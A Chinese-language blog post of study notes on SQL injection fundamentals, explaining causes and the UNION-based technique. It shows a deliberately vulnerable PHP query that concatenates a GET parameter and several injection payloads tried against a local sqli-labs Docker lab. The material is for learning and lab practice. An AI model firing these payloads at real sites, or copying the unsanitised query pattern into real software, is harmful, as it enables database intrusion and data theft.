---
layout: post
title: "1.1.1-SQL注入-SQL注入基础-SQL注入原理分析"
date: 2018-06-11
category: web安全
tags: sql注入 
---

## SQL注入原理分析

### SQL注入背景介绍-SQL语言介绍
sql 结构化查询语言  
通用的功能极强的关系数据库标准语言  
功能包括查询、操纵、定义和控制四个方面  
不需要告诉SQL如何访问数据库，只要告诉SQL需要数据库做什么 

### SQL注入产生原因
网络技术与信息技术高速发展，B/S模式具有界面统一，使用简单，易于维护，扩展性好，共享度高等优点，B/S模式越来越多的被应用于程序编写中。  

1. B/S建立在互联网，对安全控制能力较弱
2. 开发人员水平和经验参差不齐，没有在编写代码时对用户的输入数据或者页面携带信息进行必要的合法性判断。  

攻击者利用这个机会**提交一段数据库查询代码**，根据程序返回的结果，就可以获得一些数据库信息。

### SQL注入核心原理

SQL注入是一种将恶意的SQL代码**插入或添加到应用（用户）的输入参数**的攻击，攻击者探测出开发者编程过程中的漏洞，利用这些漏洞，巧妙的**构造SQL语句**对数据库系统的内容进行直接**检索或修改**。


灵活的SQL查询语句+用户输入的数据带入了SQL语句=用户直接操作数据库->**SQL注入漏洞**

	select version();
	select id from where id=1;
	select id from jobs where id=1 union select version();

	select id.location from jobs where id=1 union select 1,version();  // 1是占位

用户输入可控，代码对用户输入进行了拼接，带入SQL语句，产生SQL注入漏洞

http://test.com/index.php?id=1*UNION SELECT 1,version()#*


	$id=$_GET['id'];// id没做处理
	$sql="SELECT * FROM users WHEre id='$id' LIMIT 0,1"

	select id,location from jobs where id=1 union select 1,version()#


<br/>

	docker ps --help
	docker ps -a
	docker exec -it <id> /bin/bash
	mysql
	show databases;
	use security;
	show tables;

	select * from users;
	select username from users where id=1;
	select username,password from users where id=1;

	select 1;
	select 1123;
	select version();
	select username,password from users where id=1 union select version();
	select username,password from users where id=1 union select 1,version();

	select * from users where id=1 limit 0,1;
	select * from users where id=-1 union select 1,2,version()# limit 0,1;

	// 浏览器
	http://127.0.0.1:90/Less-1/?id=1%27%20union%20select%201,2,3%23
	?id=1' union select 1,2,3
	// %23 #

	http://127.0.0.1:90/Less-1/?id=-1%27%20union%20select%201,version(),3%23
	?id=-1' union select 1,version(),3
	// 需要让它出个错

	// 控制台
	// 退出mysql
	exit

	cd /var/www/html/Less-1
	cat index.php
	vi index.php
	// 编辑
	echo $sql
	:wq


todo sqli-labs源码地址

	docker ps -a
	docker exec -it <id> /bin/bash
	cd /var/www/html/Less-1


